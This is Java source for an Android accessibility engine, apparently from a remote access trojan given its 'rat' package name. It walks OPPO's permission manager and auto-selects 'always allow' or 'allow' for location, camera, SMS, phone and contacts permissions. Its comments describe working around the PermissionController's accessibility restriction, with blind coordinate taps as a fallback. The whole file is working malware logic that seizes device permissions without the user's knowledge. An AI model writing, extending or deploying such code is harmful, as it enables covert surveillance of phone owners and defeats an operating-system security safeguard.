package com.vendor.rat.auto.engine.vendor;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.util.GkdSelectorHelper;
import com.vendor.rat.auto.util.ScreenAdaptUtil;

import java.util.ArrayList;
import java.util.List;

/**
 * OPPO 权限管理页面自动化授权引擎
 *
 * 通过 com.oplus.securitypermission (普通 OPPO 应用) 的权限管理页面
 * 逐个进入权限子页面，选择最高优先级的"允许"选项。
 *
 * 绕过 PermissionController 的 accessibilityDataSensitive 限制:
 *   - PermissionController (com.android.permissioncontroller) = 系统安全组件, 无障碍被阻止
 *   - 权限管理页 (com.oplus.securitypermission) = 普通 OPPO 应用, 无障碍正常工作
 *
 * 4 种权限子页面布局:
 *   A. 4 选项: 始终允许 / 使用时允许 / 每次询问 / 不允许 (位置)
 *   B. 3 选项: 使用时允许 / 每次询问 / 不允许 (摄像头, 桌面快捷方式)
 *   C. 2 选项: 允许 / 不允许 (短信, 电话, 通讯录)
 *
 * 允许按钮选择优先级: 始终允许 > 使用时允许 > 允许
 */
public class OppoPermissionEngine extends AutoEngine {

    private static final String TAG = "OppoPermEngine";

    private static final String SECURITY_PERM = "com.oplus.securitypermission";
    private static final String SETTINGS = "com.android.settings";
    private static final String PERM_CONTROLLER = "com.android.permissioncontroller";

    // 允许选项 — 按优先级排列
    private static final String[] ALLOW_PRIORITY = {
        "始终允许",
        "使用时允许",
        "允许",
    };

    // 需要跳过的权限 (不需要或不应该授权的)
    private static final String[] SKIP_PERMISSIONS = {
        "创建桌面快捷方式",
        "读取应用列表",
    };

    // 状态
    private static final String ST_PERM_LIST = "inPermList";
    private static final String ST_PERM_DETAIL = "inPermDetail";

    private int grantedCount = 0;
    private int skippedCount = 0;

    public OppoPermissionEngine() {
        super(buildMatchers(), SECURITY_PERM);
    }

    private static List<WindowMatcher> buildMatchers() {
        List<WindowMatcher> list = new ArrayList<>();
        // 权限管理列表页 + 子页面都属于 com.oplus.securitypermission
        list.add(new WindowMatcher(SECURITY_PERM)
            .addEventType(32).addEventType(2048));
        // 也监听 settings (应用详情页 → 点击权限管理)
        list.add(new WindowMatcher(SETTINGS)
            .addEventType(32));
        // 监听 PermissionController (位置/摄像头/麦克风等敏感权限)
        list.add(new WindowMatcher(PERM_CONTROLLER)
            .addEventType(32).addEventType(2048));
        return list;
    }

    @Override
    protected void onEventSafe(AccessibilityEvent event, String packageName,
                                String className) {
        if (isInPermissionList()) {
            dispatchState(ST_PERM_LIST, this::handlePermissionList,
                ST_PERM_DETAIL);
        }
        if (isInPermissionDetail()) {
            dispatchState(ST_PERM_DETAIL, this::handlePermissionDetail,
                ST_PERM_LIST);
        }
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // 由 onEventSafe 处理
    }

    @Override
    public void execute() {
        // 被动引擎，由外部导航触发
    }

    // ============ 窗口检测 ============

    /**
     * 检查是否在权限管理列表页
     * 特征: 包名 com.oplus.securitypermission + 有"允许"/"不允许"分组标题
     */
    private boolean isInPermissionList() {
        if (!SECURITY_PERM.equals(currentPackage)) return false;
        UiNode root = k();
        if (root == null) return false;
        // 检查是否有分组标题 "不允许"
        UiNode denied = GkdSelectorHelper.findOne(root, "TextView[text=\"不允许\"]");
        return denied != null;
    }

    /**
     * 检查是否在权限子页面
     * 两种情况:
     * 1. com.oplus.securitypermission 子页面（有 RadioButton）
     * 2. com.android.permissioncontroller 页面（无障碍阻断，root 可能为 null）
     */
    private boolean isInPermissionDetail() {
        // 情况 1: OPPO 安全权限页面
        if (SECURITY_PERM.equals(currentPackage)) {
            UiNode root = k();
            if (root == null) return false;
            UiNode radio = GkdSelectorHelper.findOne(root, "RadioButton");
            return radio != null;
        }
        // 情况 2: PermissionController 页面
        if (PERM_CONTROLLER.equals(currentPackage)) {
            return true;  // 无障碍被阻断，无法检测内容，直接认为在权限子页面
        }
        return false;
    }

    // ============ 状态处理 ============

    /**
     * 权限列表页: 找到第一个"不允许"的权限并点击进入
     */
    private void handlePermissionList() {
        sleep(500);
        activateRoot();

        UiNode root = k();
        if (root == null) return;

        // 找到"不允许"分组下的权限条目
        // 策略: 遍历所有 clickable 行，找到状态为"不允许"的
        List<UiNode> allNodes = GkdSelectorHelper.findAll(root, "TextView[text=\"不允许\"]");

        if (allNodes == null || allNodes.isEmpty()) {
            Log.d(TAG, "无'不允许'权限，所有权限已授权");
            finishEngine();
            return;
        }

        // 找到一个"不允许"状态文本的 clickable 父行
        for (UiNode deniedText : allNodes) {
            // 跳过分组标题 (没有对应的权限名)
            UiNode parent = deniedText.findClickableParent();
            if (parent == null) continue;

            // 获取同行的权限名文本
            String permName = getPermNameFromRow(parent);
            if (permName == null) continue;

            // 跳过不需要的权限
            if (shouldSkip(permName)) {
                skippedCount++;
                Log.d(TAG, "跳过权限: " + permName);
                continue;
            }

            Log.d(TAG, "进入权限子页面: " + permName);
            parent.click();
            return;
        }

        // 没找到可处理的权限 — 可能需要滚动
        UiNode scrollView = getScrollableNode();
        if (scrollView != null && scrollView.scrollForward()) {
            Log.d(TAG, "滚动查找更多权限");
            sleep(500);
            // 下次事件会重新检查
        } else {
            Log.d(TAG, "权限授权完成: granted=" + grantedCount + " skipped=" + skippedCount);
            finishEngine();
        }
    }

    /**
     * 权限子页面: 选择最高优先级的"允许"选项
     *
     * 两种页面:
     * 1. com.oplus.securitypermission → 无障碍正常，GKD Selector 匹配
     * 2. com.android.permissioncontroller → 无障碍阻断，坐标点击 fallback
     */
    private void handlePermissionDetail() {
        sleep(800);
        activateRoot();

        // PermissionController 页面: 无障碍被阻断
        if (PERM_CONTROLLER.equals(currentPackage)) {
            Log.d(TAG, "权限子页面: PermissionController, 使用坐标点击");
            if (clickAllowByCoordinate()) {
                grantedCount++;
            }
            sleep(500);
            performBack();
            return;
        }

        UiNode root = k();

        // root 为 null — 可能是 PermissionController 导致
        if (root == null) {
            Log.d(TAG, "权限子页面: root is null, 尝试坐标点击");
            if (clickAllowByCoordinate()) {
                grantedCount++;
            }
            sleep(500);
            performBack();
            return;
        }

        // com.oplus.securitypermission 页面: GKD Selector 正常匹配
        for (String allowText : ALLOW_PRIORITY) {
            UiNode row = GkdSelectorHelper.findOne(root,
                "[clickable=true] >n TextView[text=\"" + allowText + "\"]");
            if (row != null) {
                row.click();
                grantedCount++;
                Log.d(TAG, "已选择'" + allowText + "' (第 " + grantedCount + " 个)");
                sleep(500);
                performBack();
                return;
            }
        }

        Log.w(TAG, "未找到允许选项，返回列表");
        performBack();
    }

    /**
     * PermissionController 坐标点击 (自适应分辨率)
     * @return true 如果点击成功
     */
    private boolean clickAllowByCoordinate() {
        try {
            android.util.DisplayMetrics dm = getContext().getResources().getDisplayMetrics();
            int[] coord = ScreenAdaptUtil.getPermissionAllowCoordinate(
                dm.widthPixels, dm.heightPixels);
            Log.d(TAG, "坐标点击: (" + coord[0] + ", " + coord[1] + ")");
            boolean result = com.vendor.rat.utils.MiscUtils.tapAtCoordinate(coord[0], coord[1]);
            if (result) {
                sleep(1000);
            }
            return result;
        } catch (Exception e) {
            Log.e(TAG, "clickAllowByCoordinate failed", e);
            return false;
        }
    }

    // ============ 工具方法 ============

    /**
     * 从 clickable 行中提取权限名称
     */
    private String getPermNameFromRow(UiNode row) {
        // 行结构: LinearLayout [clickable] → 包含权限名 TextView + 状态 TextView
        // 权限名是第一个较长的 TextView (排除 "不允许"/"允许"/"使用时允许")
        List<UiNode> textViews = GkdSelectorHelper.findAll(row, "TextView");
        if (textViews == null) return null;

        for (UiNode tv : textViews) {
            String text = tv.getText();
            if (text != null && !text.isEmpty()
                    && !"不允许".equals(text)
                    && !"允许".equals(text)
                    && !"使用时允许".equals(text)
                    && !"仅开屏时不允许".equals(text)
                    && !"每次使用时询问".equals(text)
                    && !"始终允许".equals(text)) {
                return text;
            }
        }
        return null;
    }

    private boolean shouldSkip(String permName) {
        for (String skip : SKIP_PERMISSIONS) {
            if (skip.equals(permName)) return true;
        }
        return false;
    }

    private void finishEngine() {
        Log.d(TAG, "OppoPermissionEngine 完成: granted=" + grantedCount
            + " skipped=" + skippedCount);
        finish();
    }

    // ============ equals/hashCode ============

    @Override
    public boolean equals(Object obj) {
        return obj instanceof OppoPermissionEngine;
    }

    @Override
    public int hashCode() {
        return OppoPermissionEngine.class.getName().hashCode();
    }
}
